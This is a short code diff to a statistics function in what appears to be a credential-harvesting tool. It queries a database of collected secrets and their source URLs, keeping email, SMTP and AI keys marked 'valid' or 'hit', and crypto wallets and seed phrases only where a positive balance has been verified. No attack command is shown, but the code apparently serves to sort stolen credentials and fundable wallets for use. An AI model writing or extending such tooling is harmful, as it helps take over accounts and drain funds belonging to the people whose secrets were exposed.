@@ -358,19 +358,30 @@ def get_statistics():
     ''')
     type_counts = dict(cursor.fetchall())
 
+    # Fetch non-crypto and confirmed-balance crypto independently so a large
+    # batch of unverified wallets can't crowd out email/SMTP/AI/etc. hits.
     cursor.execute('''
         SELECT type, key_value, source_url, timestamp, metadata, status, id
         FROM credentials
         WHERE type NOT IN ('Crypto', 'Mnemonic')
-           OR (
-               type IN ('Crypto', 'Mnemonic')
-               AND verify_meta IS NOT NULL
-               AND json_extract(verify_meta, '$.balance_native') IS NOT NULL
-               AND json_extract(verify_meta, '$.balance_native') > 0
-           )
+          AND status IN ('valid', 'hit')
+        ORDER BY id DESC LIMIT 5000
+    ''')
+    non_crypto_findings = cursor.fetchall()
+
+    cursor.execute('''
+        SELECT type, key_value, source_url, timestamp, metadata, status, id
+        FROM credentials
+        WHERE type IN ('Crypto', 'Mnemonic')
+          AND status IN ('valid', 'hit')
+          AND verify_meta IS NOT NULL
+          AND json_extract(verify_meta, '$.balance_native') IS NOT NULL
+          AND json_extract(verify_meta, '$.balance_native') > 0
         ORDER BY id DESC LIMIT 500
     ''')
-    recent_findings = cursor.fetchall()
+    crypto_findings = cursor.fetchall()
+
+    recent_findings = non_crypto_findings + crypto_findings
     
     conn.close()
     
